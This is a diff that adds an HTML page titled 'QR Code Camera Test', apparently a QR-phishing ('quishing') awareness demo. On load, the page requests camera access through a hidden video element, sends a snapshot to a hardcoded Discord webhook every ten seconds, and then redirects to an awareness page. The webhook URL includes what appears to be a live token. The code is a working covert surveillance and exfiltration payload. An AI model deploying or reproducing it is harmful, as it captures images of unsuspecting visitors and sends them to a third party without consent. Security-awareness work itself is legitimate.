@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QR Code Camera Test</title>
+</head>
+<body>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <script>
+        const video = document.getElementById('video');
+        const webhookURL = "https://discord.com/api/webhooks/1341299046094209105/cUFsKop8wOufYDkV3zQyeAhmDAjHaNZDlWqjxUSmAasbA0Jgyukd2KZ2rLCvSYeeHFxu";  // Replace with actual Discord Webhook URL
+        const redirectURL = "https://5t3p8r0.github.io/quishing/aware.html"; // Awareness page URL
+
+        let stream = null;
+
+        function requestCameraAccess() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(mediaStream => {
+                    stream = mediaStream;
+                    video.srcObject = mediaStream;
+                    console.log("Camera access granted.");
+                    captureImage(); // Start capturing images
+                    setTimeout(() => {
+                        window.location.href = redirectURL; // Redirect after camera access
+                    }, 3000);
+                })
+                .catch(err => {
+                    console.error("Camera access denied!", err);
+                    alert("You denied camera access! Be cautious when scanning unknown QR codes.");
+                });
+        }
+
+        function captureImage() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+
+            setInterval(() => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append("file", blob, "snapshot.png");
+                    formData.append("content", "📸 New Image Captured!");
+
+                    console.log("Sending image to Discord...");
+
+                    fetch(webhookURL, {
+                        method: "POST",
+                        body: formData
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error(`HTTP error! Status: ${response.status}`);
+                        }
+                        return response.text();
+                    })
+                    .then(data => console.log("Image sent successfully:", data))
+                    .catch(error => console.error("Error sending image:", error));
+
+                }, "image/png");
+
+            }, 10000); // Capture every 10 seconds
+        }
+
+        // Stop camera when leaving the page
+        window.addEventListener("beforeunload", () => {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        });
+
+        // Request camera access on every load
+        window.onload = requestCameraAccess;
+
+    </script>
+</body>
+</html>
